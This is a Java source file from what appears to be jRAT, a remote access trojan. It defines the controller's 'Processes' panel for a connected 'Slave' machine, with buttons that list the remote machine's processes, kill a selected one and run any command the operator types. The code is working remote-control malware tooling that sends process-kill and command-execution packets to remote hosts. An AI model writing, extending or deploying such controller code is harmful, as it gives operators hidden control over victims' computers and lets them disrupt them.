package jrat.module.process.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet38RunCommand;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.panels.PanelControlParent;
import jrat.controller.ui.renderers.table.ProcessTableRenderer;
import jrat.controller.utils.Utils;
import jrat.module.process.PacketKillProcess;
import jrat.module.process.PacketQueryProcesses;
import oslib.OperatingSystem;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@SuppressWarnings("serial")
public class PanelProcesses extends ClientPanel {

	private JTable table;
	private TableModel model;
	private JToolBar toolBar;

	public TableModel getModel() {
		return model;
	}

	public PanelProcesses(Slave slave) {
		super(slave, "Processes", Resources.getIcon("process"));
		final Slave sl = slave;

		setLayout(new BorderLayout(0, 0));

		toolBar = new JToolBar();
		toolBar.setFloatable(false);
		add(toolBar, BorderLayout.SOUTH);

		JButton btnClearList = new JButton("Clear list");
		toolBar.add(btnClearList);
		btnClearList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClearList.setIcon(Resources.getIcon("clear"));

		JButton btnCreateProcess = new JButton("Create process");
		toolBar.add(btnCreateProcess);
		btnCreateProcess.setIcon(Resources.getIcon("process-go"));

		JButton btnKillSelected = new JButton("Kill selected");
		toolBar.add(btnKillSelected);
		btnKillSelected.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (model.getValueAt(table.getSelectedRow(), 0) != null) {
					String process;
					if (sl.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
						process = model.getValueAt(table.getSelectedRow(), 0).toString();
					} else {
						process = model.getValueAt(table.getSelectedRow(), 1).toString();
					}

					clear();

					sl.addToSendQueue(new PacketKillProcess(process));

					sl.addToSendQueue(new PacketQueryProcesses());
				}
			}
		});
		btnKillSelected.setIcon(Resources.getIcon("delete"));

		JButton btnRefresh = new JButton("Refresh");
		toolBar.add(btnRefresh);
		btnRefresh.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				sl.addToSendQueue(new PacketQueryProcesses());
			}
		});
		btnRefresh.setIcon(Resources.getIcon("update"));
		btnCreateProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				onRunCommand();
			}
		});

		table = new DefaultJTable();
		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Name", "Process ID", "Type/User", "Memory usage" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(287);
		table.getColumnModel().getColumn(2).setPreferredWidth(108);
		table.getColumnModel().getColumn(3).setPreferredWidth(100);
		table.setRowHeight(25);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setViewportView(table);

		add(scrollPane, BorderLayout.CENTER);
	}

	private void clear() {
        while (model.getRowCount() > 0) {
            model.removeRow(0);
        }
    }

	private void onRunCommand() {
        String proc = Utils.showDialog("Create process", "Input name of process");
        if (proc == null) {
            return;
        }
        proc = proc.trim();

        clear();
        slave.addToSendQueue(new Packet38RunCommand(proc));
        slave.addToSendQueue(new PacketQueryProcesses());
    }
}
